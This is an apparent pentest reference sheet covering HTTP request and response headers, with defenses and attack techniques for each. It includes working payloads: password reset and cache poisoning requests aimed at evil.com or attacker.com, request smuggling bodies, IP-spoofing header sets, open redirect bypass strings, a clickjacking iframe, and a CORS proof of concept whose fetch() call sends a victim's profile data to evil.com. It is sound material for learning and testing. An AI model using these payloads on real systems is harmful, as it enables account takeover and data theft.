HTTP Request Headers
Headers sent FROM the client TO the server — primary attack surface
Host REQ
Critical Password Reset Poison Cache Poison
+
What It Is

The Host header specifies the domain name of the server being requested. It is mandatory in HTTP/1.1. It tells the web server which virtual host (vhost) to serve — a single IP can host thousands of domains, and this header decides which one responds.

# Example HTTP/1.1 request GET /reset-password?token=abc123 HTTP/1.1 Host: bank.com Cookie: session=xyz

The server uses this to route requests, generate links in emails, and build absolute URLs. This is exactly where the danger lies.

Attack Vectors
💀 Password Reset Poisoning

Change the Host header to your server. The app builds a reset link using Host → victim gets an email with link pointing to your server → you steal the reset token.

# Attacker sends this to /forgot-password POST /forgot-password HTTP/1.1 Host: attacker.com # App generates: # "Click here: https://attacker.com/reset?token=SECRET" # Victim clicks → you get the token
  • Web cache poisoning — inject Host to poison cached responses with your URL
  • SSRF via Host — some apps make backend requests using the Host value
  • Virtual host brute forcing — fuzzing Host to discover hidden vhosts
  • X-Forwarded-Host bypass — if Host is filtered, try this alternate
  • Routing bypass — accessing internal services by forging Host
Defense / Detection
  • Whitelist allowed Host values server-side
  • Never use Host header to construct URLs in emails or redirects
  • Use a hardcoded base URL from server config instead
  • Burp: Try modifying Host to your Collaborator URL on password reset
Pentest Checklist
  • Test password reset with Host: burpcollaborator.net
  • Add X-Forwarded-Host: evil.com alongside real Host
  • Fuzz vhosts with ffuf -H "Host: FUZZ.target.com"
  • Check if 400 vs 200 reveals internal routing info
Authorization REQ
Critical Bearer Tokens Basic Auth
+
What It Is

Carries credentials to authenticate the client with the server. Three main schemes you'll encounter:

# Basic Auth — base64(username:password) Authorization: Basic dXNlcjpwYXNz # Bearer Token (JWT or OAuth) Authorization: Bearer eyJhbGciOiJIUzI1NiJ9... # Digest Auth Authorization: Digest username="user", realm="..." # API Key (non-standard but common) Authorization: ApiKey sk_live_abc123...
Attack Vectors
  • Basic Auth decode — base64 is NOT encryption. Decode immediately → plaintext creds
  • JWT attacks — alg:none, RS256→HS256, weak secret brute-force
  • Token replay — stealing Bearer tokens and replaying them
  • Token in URL — if token leaks into Referer or logs
  • Missing auth — remove this header entirely — does endpoint still respond?
  • Privilege escalation — swap your JWT sub/role claim with another user's
💀 Missing Authorization Check

Delete the entire Authorization header from the request. If the API still returns data — you found a broken auth vulnerability. Always try this.

Defense
  • Never use Basic Auth on non-TLS connections
  • JWT: use RS256 with proper key validation, not HS256 with weak secret
  • Short token expiry (15 min for access tokens)
  • Validate tokens server-side on EVERY request
Pentest Steps
  • Decode Basic Auth: echo "dXNlcjpwYXNz" | base64 -d
  • Try removing header → check if still works
  • Replace JWT with none algorithm variant
  • Brute JWT secret: hashcat -a 0 -m 16500 token.txt wordlist
Cookie REQ
Critical Session Hijacking CSRF
+
What It Is

The Cookie request header sends all cookies the browser has stored for this domain back to the server. It is the primary mechanism for session management. Typically contains a session ID that maps to server-side state.

Cookie: session=abc123; csrf_token=xyz789; pref=dark # Multiple cookies separated by '; ' (semicolon-space) # Sent automatically by browser — attacker goal: steal these

Session cookies are the crown jewel for attackers. Stealing one = full account takeover without knowing password.

Attack Vectors
  • XSS cookie theft — document.cookie exfiltration (bypassed by HttpOnly)
  • Network sniffing — HTTP (no TLS) = plaintext cookie exposure
  • Session fixation — set victim's session ID before they authenticate
  • Session prediction — guessing sequential or weak session IDs
  • CSRF — browser auto-sends cookies on cross-origin requests
  • Subdomain cookie theft — subdomain XSS steals parent domain cookies
💀 Cookie Injection via CRLF

If a parameter is reflected into a Set-Cookie header, injecting %0d%0aSet-Cookie: session=evil adds a new cookie. This is CRLF injection → cookie poisoning.

Content-Length REQ
Critical HTTP Smuggling
+
What It Is

Specifies the exact byte size of the request body. The server reads exactly this many bytes and considers the rest to be the next request. When this disagrees with Transfer-Encoding, you get HTTP Request Smuggling — one of the most powerful modern web vulnerabilities.

POST /data HTTP/1.1 Host: target.com Content-Length: 13 Hello, World!
HTTP Request Smuggling (CL.TE)

Front-end uses Content-Length. Back-end uses Transfer-Encoding. The leftover body bytes become the start of the next parsed request:

POST / HTTP/1.1 Content-Length: 49 Transfer-Encoding: chunked e q=smuggled&x= 0 GET /admin HTTP/1.1 Host: internal

Back-end sees the chunked body end at 0, then reads the next "request" — which is your smuggled GET /admin.

Transfer-Encoding REQ
Critical TE.CL Smuggling TE.TE Smuggling
+
What It Is

Transfer-Encoding: chunked means the body is sent in size-prefixed chunks, ending with a zero-length chunk (0\r\n\r\n). This is the other side of the Content-Length coin — and the engine behind HTTP Request Smuggling.

# Chunked body format: 5 ← chunk size in hex Hello 6 World 0 ← terminating chunk
TE.TE Smuggling — Obfuscation

Both servers use TE but you obfuscate it so one ignores it:

# Obfuscated TE to confuse one server: Transfer-Encoding: xchunked Transfer-Encoding: x Transfer-Encoding: chunked, ← trailing space Transfer-Encoding: chunked ← tab-indented Transfer-Encoding: chunked X: X[\n]Transfer-Encoding: chunked

One server sees a valid TE, processes it. The other sees garbage TE, falls back to CL. Desync achieved.

X-Forwarded-For REQ
High IP Spoofing Rate Limit Bypass
+
What It Is

Added by proxies/load balancers to pass the original client IP to the backend. Format is a comma-separated list of IPs — each proxy appends its own.

X-Forwarded-For: 203.0.113.1, 198.51.100.2 # First IP = original client # Subsequent IPs = proxies in chain # Related headers doing the same thing: X-Real-IP: 203.0.113.1 True-Client-IP: 203.0.113.1 CF-Connecting-IP: 203.0.113.1
Attack Vectors
  • IP whitelist bypass — add X-Forwarded-For: 127.0.0.1 to appear as localhost and access admin panels
  • Rate limit bypass — change IP per request to evade per-IP rate limits
  • Geo-restriction bypass — spoof a whitelisted country's IP
  • Log poisoning — inject payloads into XFF that end up in logs
# Bypass "admin from localhost only" check: X-Forwarded-For: 127.0.0.1 X-Real-IP: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Client-IP: 127.0.0.1
X-Forwarded-Host REQ
Critical Cache Poisoning Password Reset
+
What It Is

Like X-Forwarded-For but for the Host header. When a load balancer rewrites the Host header, it stashes the original in X-Forwarded-Host. Many applications use this to build absolute URLs — making it a perfect injection point if not validated.

X-Forwarded-Host: original-host.com # Also look for these aliases: X-Host: ... X-Forwarded-Server: ... X-HTTP-Host-Override: ...
Cache Poisoning Attack
💀 Web Cache Poisoning via X-Forwarded-Host

The app returns a cached response that includes a URL built from X-Forwarded-Host. Inject evil.com → cached response now points everyone to your server. Works even without XSS if JS src is built dynamically.

GET / HTTP/1.1 Host: legitimate.com X-Forwarded-Host: evil.com # Response gets cached: # <script src="https://evil.com/app.js"></script> # Every user who hits cache gets XSS'd
Referer REQ
High Data Leakage CSRF Bypass
+
What It Is

Tells the server the URL of the page that made this request. (Note: it's intentionally misspelled — "referrer" has two r's but the HTTP spec says "referer"). Sent automatically by browsers on navigation, form submission, and resource loading.

Referer: https://bank.com/account?token=secret123 # If the URL contains sensitive data, # it leaks to every external resource on the page # (analytics scripts, CDNs, ads)
Attack Vectors
  • Token leakage — password reset tokens in URLs leak via Referer to third-party scripts
  • Sensitive data exposure — search terms, user IDs, internal paths in Referer logs
  • Referer-based CSRF protection bypass — some apps check Referer for CSRF protection. Bypass: send no Referer (null), or manipulate the URL structure
  • SSRF via Referer — some servers fetch the Referer URL for preview generation
# Referer CSRF check bypass methods: # 1. Remove Referer header entirely # 2. Use <meta name="referrer" content="no-referrer"> # 3. Spoof with: Referer: https://target.com.evil.com/ # 4. Use data: URI — sends no Referer
Origin REQ
High CORS Bypass CSRF
+
What It Is

Similar to Referer but only contains the scheme + domain + port — no path, no query. Sent on: cross-origin requests, CORS preflight, POST forms. This is what the server checks to enforce CORS policy.

# Referer vs Origin comparison: Referer: https://app.com/page?q=secret Origin: https://app.com # Origin = no path, no query, more private # "null" origin — sent from: # - sandboxed iframes # - data: URI pages # - file:// pages Origin: null
CORS / CSRF Attack
  • CORS misconfiguration test — send Origin: evil.com, see if Access-Control-Allow-Origin: evil.com comes back
  • Null origin bypass — if server allows null origin, use a sandboxed iframe to make requests with Origin: null
  • Subdomain bypass — if *.target.com trusted, find an XSS on any subdomain
  • Origin reflection — server reflects whatever Origin you send → CORS theft possible
Content-Type REQ
High CSRF Bypass Upload Bypass XXE
+
What It Is

Tells the server what format the request body is in. The server uses this to parse the body correctly. Common values:

Content-Type: application/json Content-Type: application/x-www-form-urlencoded Content-Type: multipart/form-data; boundary=----xyz Content-Type: application/xml Content-Type: text/xml Content-Type: application/x-www-form-urlencoded
Attack Vectors
  • CORS preflight bypass — "simple" content types (text/plain, form-urlencoded) skip CORS preflight → JSON CSRF possible
  • XXE via Content-Type — change application/json to application/xml, submit XML with entity declaration
  • File upload MIME bypass — change image/jpeg to application/x-php to trick upload filter
  • Parser confusion — submit JSON as form-encoded — server may parse differently than expected
💀 JSON CSRF via Content-Type

API requires JSON. Change Content-Type to text/plain — browser sends this without preflight. Server might still parse the body as JSON if it ignores Content-Type. CSRF without preflight = win.

User-Agent REQ
Medium WAF Bypass Fingerprinting
+
What It Is

Identifies the client software making the request. Contains browser name, version, OS, rendering engine. Sent automatically by browsers; can be set to anything by tools like curl/Burp.

# Browser UA: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 # Scanner tell: User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org) User-Agent: Nikto/2.1.6
Attack Vectors
  • WAF bypass — some WAFs skip inspection for Googlebot UA. Spoof it: Googlebot/2.1
  • Different content served — mobile UA may get different JS with fewer security controls
  • UA-based SQLi — if UA is logged to DB, it's an injection point
  • Scan detection evasion — always change tool UA to a real browser string
  • SSRF via UA — rare but some apps fetch URLs found in UA strings
X-HTTP-Method-Override REQ
High Access Control Bypass
+
What It Is

Allows tunneling HTTP methods through POST. Originally for old browsers/firewalls that only allow GET/POST. The server may treat a POST as if it were the method specified in this header.

POST /api/users/5 HTTP/1.1 X-HTTP-Method-Override: DELETE # Server processes this as DELETE /api/users/5 # Bypasses firewall rules blocking DELETE # Also try these aliases: X-Method-Override: DELETE X-HTTP-Method: PUT _method: PATCH ← form field
Access Control Bypass
💀 Method-Based Access Control Bypass

App blocks DELETE /admin/users/5 for non-admins. But allows POST from any user. Add X-HTTP-Method-Override: DELETE to your POST → backend processes it as DELETE, bypassing the method-based ACL check.

  • Try on every endpoint that has method restrictions
  • Also try as URL parameter: ?_method=DELETE
  • Test PATCH as POST override to modify resources you shouldn't
Sec-Fetch-* Headers REQ
Medium Fetch Metadata
+
What They Are

Modern browser security headers that provide context about WHY a request is being made. Part of the Fetch Metadata spec. Cannot be set by JavaScript — browser-controlled only.

Sec-Fetch-Site: same-origin | cross-site | same-site | none Sec-Fetch-Mode: navigate | cors | no-cors | websocket Sec-Fetch-Dest: document | script | image | empty | ... Sec-Fetch-User: ?1 ← user-initiated navigation # CSRF request from evil.com has: # Sec-Fetch-Site: cross-site # Server can block it at this point
Bypass Angle
  • Missing validation — most apps don't validate these. Check if they're even read.
  • Curl/tools don't send them — server-side defenses based only on these can be bypassed from non-browser clients
  • Sec-Fetch-Site: none — direct navigation, can bypass some CSRF checks
  • If site uses these for CSRF protection: replay in curl without headers → direct access
Accept-Encoding REQ
Medium BREACH Attack
+
What It Is

Tells the server which compression algorithms the client supports.

Accept-Encoding: gzip, deflate, br, zstd # br = Brotli (modern) # gzip = classic # deflate = DEFLATE (zlib)
BREACH Attack
💀 BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext)

If: HTTPS + gzip + secret reflected in response body + attacker can inject into request → compression oracle. Attacker measures response size changes to extract secrets 1 byte at a time. Killed by removing compression or using per-request secrets.

Accept REQ
Low Content Negotiation
+
What It Is

Tells the server which content types the client can handle. Server should respond with a matching Content-Type.

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 # q= is quality factor, 0-1 preference weight
Security Angle
  • Content negotiation abuse — change Accept to application/json to get JSON response revealing more data than HTML view
  • Different code paths — XML responses may be processed differently, enabling XXE
  • Try: Accept: application/xml on JSON endpoints to trigger XML parsing
Upgrade / Connection REQ
High WebSocket Hijack
+
What It Is

Used to upgrade from HTTP/1.1 to WebSocket. The full WebSocket handshake:

GET /chat HTTP/1.1 Host: target.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Sec-WebSocket-Version: 13 Origin: https://target.com
WebSocket Hijacking
💀 Cross-Site WebSocket Hijacking

WebSocket handshake has no CSRF token. If the server only validates Origin — and you can spoof or if Origin isn't checked — you can make a victim's browser open a WebSocket to the target and relay messages to you. Full account compromise if chat/live data contains sensitive info.

Range REQ
Medium DoS via Byte Range
+
What It Is

Requests only part of a resource. Server responds with 206 Partial Content. Used for resumable downloads, video streaming.

Range: bytes=0-1023 ← first 1024 bytes Range: bytes=-500 ← last 500 bytes Range: bytes=9500- ← from byte 9500 to end
Attack Vectors
  • Range DoS (RUDY variant) — request Range: bytes=0-0 for a massive file, repeatedly → resource exhaustion
  • Overlapping ranges — Range: bytes=0-1, 0-2, 0-3, ... — Apache "killer" attack
  • Reading partial file content — if file exposure exists, use Range to exfiltrate in chunks
Forwarded REQ
High RFC 7239 — IP Spoof
+
What It Is

The standardized (RFC 7239) version of X-Forwarded-For. Combines multiple forwarding headers into one. Less common in practice but some frameworks use it.

Forwarded: for=203.0.113.1;proto=https;host=example.com Forwarded: for=192.0.2.1, for=203.0.113.1
Attack Vector

Same as XFF — spoof the for= value to bypass IP-based controls. Try all IP header variants simultaneously since you don't know which one the backend reads.

X-Forwarded-For: 127.0.0.1 X-Real-IP: 127.0.0.1 Forwarded: for=127.0.0.1 X-Client-IP: 127.0.0.1 True-Client-IP: 127.0.0.1
If-Modified-Since / If-None-Match REQ
Low Cache Timing
+
What They Are

Conditional request headers for caching. Browser sends these to ask "has this changed since I last got it?" If unchanged, server returns 304 Not Modified (no body, saving bandwidth).

If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT If-None-Match: "etag-value-abc123"
Security Angle
  • ETag as fingerprint — ETag can leak inode numbers on Apache (fixed in newer versions) — server fingerprinting
  • Timing oracle — 304 vs 200 response time difference can indicate content staleness
  • Cache control bypass — force fresh response by removing these headers
Cache-Control (Request) REQ
Medium Cache Bypass
+
What It Is
Cache-Control: no-cache ← force fresh from origin Cache-Control: no-store ← don't cache this request Cache-Control: max-age=0 ← treat cached as stale Pragma: no-cache ← legacy HTTP/1.0 equiv
Pentest Use
  • Add Cache-Control: no-cache during testing to always get fresh server responses, not cached CDN responses
  • Remove Cache-Control to see if CDN caches a sensitive response you can then retrieve anonymously
  • Use with cache poisoning — control whether your poisoned response gets cached

HTTP Response Headers
Headers sent FROM the server TO the client — your defense layer, their bypass surface
Pentest Mindset for Response Headers Missing security headers = vulnerabilities. Present but misconfigured = bypasses. When you see a security header, your job is to find how to get around it. When it's missing, your job is to exploit the absence.
Content-Security-Policy RES
Critical XSS Defense CSP Bypass
+
What It Is

The most powerful XSS defense available. Tells the browser what resources it's allowed to load and execute. A properly configured CSP makes XSS nearly impossible to execute — which is why attackers focus heavily on finding CSP bypasses.

# Strong CSP (nonce-based): Content-Security-Policy: default-src 'none'; script-src 'nonce-r4nd0m123' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none';
CSP Bypass Techniques
  • unsafe-inline present — CSP is useless. Inline script tags work. Look for this first.
  • unsafe-eval present — eval(), Function(), setTimeout(str) all work
  • Whitelisted CDN bypass — if cdn.jsdelivr.net is allowed, find a JS file there that can be abused (Angular, etc.)
  • JSONP bypass — if target.com/api?callback=x is in whitelist, inject JSONP callback as XSS payload
  • base-uri missing — inject <base href="//evil.com"> → all relative URLs hijacked
  • Nonce reuse — if nonce doesn't change per request, steal it and inject script
  • script-src * — wildcard allows loading from ANY domain
  • data: URI — if data: allowed in script-src, direct XSS

Strict-Transport-Security (HSTS) RES
Critical SSL Strip Defense
+
What It Is

Tells the browser: "For this domain, ONLY connect via HTTPS for the next max-age seconds. Never try HTTP." This prevents SSL stripping attacks where an attacker on your network downgrades your HTTPS to HTTP.

# Basic HSTS: Strict-Transport-Security: max-age=31536000 # With subdomains: Strict-Transport-Security: max-age=31536000; includeSubDomains # With preload (submit to browsers' built-in list): Strict-Transport-Security: max-age=63072000; includeSubDomains; preload # MISSING = SSL stripping attack possible: HTTP/1.1 200 OK ← no HSTS = danger
Attack When Missing
💀 SSL Stripping (MITM)

User types bank.com (HTTP). Without HSTS, attacker on same network intercepts the HTTP request, serves a fake HTTP version while making HTTPS request to real bank. User sees HTTP, attacker sees everything. Tool: sslstrip, bettercap.

  • First-visit attack — HSTS only works after first visit. Preload list fixes this.
  • includeSubDomains missing — subdomain can be HTTP-only, attack vector remains
  • Short max-age — if max-age=0, HSTS is being removed. Possible downgrade prep.
  • Cookie theft via HTTP — no HSTS + no Secure cookie flag = cookies over HTTP
X-Frame-Options RES
High Clickjacking Defense
+
What It Is

Prevents your page from being embedded in an iframe on another site — blocking clickjacking. Three possible values:

X-Frame-Options: DENY ← never in any frame X-Frame-Options: SAMEORIGIN ← only same origin frames X-Frame-Options: ALLOW-FROM https://trusted.com # ALLOW-FROM is deprecated and NOT supported in Chrome/Firefox # Use CSP frame-ancestors instead # Modern equivalent (preferred): Content-Security-Policy: frame-ancestors 'none';
When Missing → Clickjacking
💀 Clickjacking Attack

Embed victim site in transparent iframe over a decoy button. Victim thinks they're clicking "Win prize" but they're actually clicking "Transfer $1000" on the bank site underneath. No X-Frame-Options = this works.

<!-- Clickjacking PoC --> <iframe src="https://victim.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe> <button>Click to win!</button>
X-Content-Type-Options RES
High MIME Sniffing Defense
+
What It Is

Only one valid value: nosniff. Tells the browser: "Do NOT guess the content type — use exactly what I said in Content-Type." Without it, browsers MIME-sniff content, which can turn a text file into executable script.

X-Content-Type-Options: nosniff # Without nosniff: browser sniffs content # Upload "image" that contains HTML/JS # Browser serves it with text/plain but sniffs as text/html # → XSS execution possible in some scenarios
MIME Confusion Attack
  • Upload a .jpg that contains <script>alert(1)</script>
  • Server sets Content-Type: image/jpeg
  • Without nosniff, browser sniffs content type → sees HTML → executes JS
  • With nosniff, browser respects image/jpeg → displays as broken image
  • Also prevents cross-origin style/script type confusion attacks
Set-Cookie RES
Critical All Cookie Attributes
+
Full Cookie Anatomy
Set-Cookie: session=abc123; Secure; ← HTTPS only HttpOnly; ← no JS access SameSite=Strict; ← no cross-site Path=/; Domain=app.com; Max-Age=3600 ← 1 hour expiry # WORST CASE (all missing): Set-Cookie: session=abc123 # No Secure → sent over HTTP # No HttpOnly → XSS steals it # No SameSite → CSRF works
Missing Attribute Exploitation
  • No Secure → cookie sent over HTTP → network intercept possible
  • No HttpOnly → document.cookie in XSS steals session
  • SameSite=None → CSRF attacks work if no separate token
  • SameSite=Lax → GET-based CSRF still possible (top-level nav)
  • No expiry → session lasts forever → long theft window
  • Domain=.app.com → all subdomains get cookie → subdomain XSS steals it

Access-Control-Allow-Origin RES
Critical CORS Misconfig Data Theft
+
CORS Full Explanation

CORS (Cross-Origin Resource Sharing) is the browser mechanism that controls which origins can read responses from cross-origin requests. The browser enforces this — servers just set the policy via headers.

# CORS Response Headers: Access-Control-Allow-Origin: https://trusted.com Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET, POST, DELETE Access-Control-Allow-Headers: Authorization, Content-Type Access-Control-Expose-Headers: X-Custom-Header Access-Control-Max-Age: 86400 # DANGER: Wildcard + Credentials = CRITICAL BUG Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true # Browsers actually BLOCK this combo, but… # If server reflects Origin header instead of *: Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true # Now evil.com can read any cross-origin response WITH cookies
CORS Attack Scenarios
💀 Origin Reflection Attack

Server reflects your Origin header back as ACAO. Send Origin: evil.com → get ACAO: evil.com + ACAC: true → your page can make authenticated requests to target API and read all responses. Full account data theft.

  • Wildcard subdomain trust — *.target.com allowed → get XSS on any subdomain
  • Null origin bypass — sandboxed iframe sends Origin: null, server allows null → CORS bypass
  • Regex bypass — targetcom.evil.com matches regex "target.com" → allowed
  • http vs https — if http://target.com allowed, HTTP MITM possible
// CORS exploit PoC: var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://victim.com/api/profile'); xhr.withCredentials = true; // sends cookies xhr.onload = function() { fetch('https://evil.com/?data=' + btoa(xhr.responseText)); }; xhr.send();
Referrer-Policy RES
High Data Leakage Defense
+
What It Is & All Values

Controls how much referrer information is sent in the Referer header. Missing or permissive = sensitive URL data leaks to third parties.

ValueWhat's Sent
no-referrerNothing sent ever
no-referrer-when-downgradeFull URL, except HTTPS→HTTP (default)
same-originFull URL only for same-origin requests
originJust scheme+host (no path/query)
strict-originorigin only, nothing on HTTPS→HTTP
origin-when-cross-originFull URL same-origin, just origin cross-origin
strict-origin-when-cross-originBest practice — origin only cross-origin
unsafe-urlFull URL always — DANGEROUS
Attack Angle
  • Token leakage via Referer — password reset link /reset?token=SECRET → third party analytics on next page sees the full URL with token
  • Path disclosure — internal path structure revealed to external partners via Referer
  • User enumeration — /profile/username leaks usernames via Referer
Best Practice

Use strict-origin-when-cross-origin — only sends scheme+host cross-origin, full URL same-origin.

Permissions-Policy RES
Medium Browser API Restriction
+
What It Is

Formerly Feature-Policy. Restricts which browser APIs and features this page (and embedded iframes) can use. Critical in sensitive apps.

Permissions-Policy: camera=(), ← block camera entirely microphone=(), ← block mic entirely geolocation=(), ← block location payment=(self), ← payment only self usb=(), accelerometer=()
Pentest Angle
  • Missing policy — embedded malicious iframe could use camera/mic APIs on the parent's domain
  • Overly permissive — payment=* allows any iframe to use Payment Request API
  • XSS amplification — XSS + no Permissions-Policy = attacker can access device camera via JS
  • Check for this header — its absence on sensitive apps (banking, healthcare) is a finding
Server & X-Powered-By RES
High Version Disclosure Fingerprinting
+
What They Are

Tell attackers exactly what software and version is running. This is the starting point for searching known CVEs.

# Information disclosure: Server: Apache/2.4.49 (Unix) X-Powered-By: PHP/7.2.1 X-AspNet-Version: 4.0.30319 X-Generator: WordPress 5.8.1 # Good (suppressed): Server: nginx ← no version # Or completely removed
Exploitation Path
  • Apache 2.4.49/50 → CVE-2021-41773 path traversal + RCE
  • PHP version disclosure → look up version-specific vulnerabilities
  • WordPress version → wpscan --url target.com with version-targeted exploits
  • IIS version → specific WebDAV, ASP.NET vulnerabilities per version
  • Search: site:exploit-db.com [software] [version]
  • Check: vulners.com, nvd.nist.gov with exact version
Cache-Control (Response) RES
High Sensitive Data Caching Cache Poisoning
+
All Directives
# Prevent caching sensitive content: Cache-Control: no-store, no-cache, must-revalidate # Common directives: no-store ← NEVER store this response anywhere no-cache ← store but revalidate before use private ← only browser cache, not CDN/proxies public ← CDN can cache this max-age=3600 ← fresh for 1 hour s-maxage=60 ← CDN cache for 60s only must-revalidate ← revalidate when stale immutable ← never revalidate (static assets)
Attack Vectors
  • Sensitive response cached — banking page, profile data with Cache-Control: public or max-age → next user on shared browser/CDN sees previous user's data
  • Cache poisoning — inject malicious response into CDN cache via unkeyed headers → served to all users
  • Shared cache disclosure — CDN cached a POST response (misconfiguration) → replay GET to retrieve cached sensitive response
💀 Caching Sensitive Page

Bank's account page lacks Cache-Control: no-store. CDN caches the authenticated response. Next visitor to the same URL (before cache expires) gets the previous user's account data — without being logged in.

Location RES
High Open Redirect Token Leakage
+
What It Is

Used in redirect responses (301, 302, 307, 308) to specify where the client should go next. If the redirect destination can be controlled by user input — that's an Open Redirect vulnerability.

# Server sends: HTTP/1.1 302 Found Location: https://app.com/dashboard # Vulnerable code (PHP): header("Location: " . $_GET['next']); # Attacker URL: /login?next=https://evil.com # Victim gets redirected to evil.com after login
Attack Chains
  • Phishing via open redirect — trusted domain redirects to phishing site. Victim trusts the URL.
  • OAuth token theft — open redirect in OAuth redirect_uri → authorization code sent to attacker
  • SSRF via redirect — SSRF filters allow target.com. target.com redirects to 169.254.169.254. Server follows redirect.
  • Token in Location — if sensitive tokens appear in redirect URLs, they leak via Referer
# Open redirect filter bypass: https://target.com/redirect?to=//evil.com https://target.com/redirect?to=https:evil.com https://target.com/redirect?to=https://target.com@evil.com https://target.com/redirect?to=\/\/evil.com https://target.com/redirect?to=%2F%2Fevil.com
COOP / COEP / CORP RES
Medium Spectre Defense
+
What They Are

Three headers that together enable cross-origin isolation — required to use SharedArrayBuffer and high-res timers safely (after Spectre/Meltdown). Also restrict how pages can interact cross-origin.

# Cross-Origin-Opener-Policy: COOP: same-origin # Isolates browsing context group from cross-origin pages # Prevents window.opener attacks # Cross-Origin-Embedder-Policy: COEP: require-corp # Requires all subresources to have CORP header # Cross-Origin-Resource-Policy: CORP: same-origin | same-site | cross-origin # Controls who can embed/load this resource
Security Angles
  • COOP missing — window.opener exploitation: a popup opened by attacker can access opener's window object
  • CORP missing — cross-origin pages can embed your resources in img/script tags, enabling timing attacks (Spectre-style cross-origin leaks)
  • XS-Leaks — timing/oracle attacks that leak cross-origin data without CORS by measuring side channels
X-XSS-Protection RES
Deprecated Legacy Only
+
What It Is (Was)

A legacy header for IE/Chrome's built-in XSS filter. Completely deprecated — Chrome removed it in 2019, Firefox never implemented it. Using it today can actually CREATE security vulnerabilities.

X-XSS-Protection: 1; mode=block # DO NOT USE. Deprecated. Causes more harm than good. # The mode=block variant was found to cause XSS # on pages that didn't have it before (bypass via blocking # legitimate content, exposing different code paths) # Correct: Use CSP instead. It's the real fix. Content-Security-Policy: script-src 'self'
Pentest Note
  • If you see this header — note it but don't rely on it being a defense
  • It offers zero protection in modern browsers
  • Presence indicates legacy/outdated security headers — check for other outdated defenses
  • Its absence is NOT a vulnerability in a report (CSP absence is)
Expect-CT RES
Deprecated Certificate Transparency
+
What It Was

Told browsers to require Certificate Transparency (CT) logs for TLS certificates on this domain. CT logs make it impossible for CAs to issue unauthorized certs without detection. Deprecated in 2021 — CT is now mandatory for all publicly-trusted certs.

Expect-CT: max-age=86400, enforce # Still seen on old sites. No security value today. # Chrome enforces CT by default since 2018. # Safe to ignore in findings.
Context

Certificate Transparency means every TLS certificate must be logged in public CT logs. This prevents rogue CAs from issuing fraudulent certificates for your domain silently. You can monitor CT logs for your domain using crt.sh — useful for reconnaissance too (subdomain discovery).
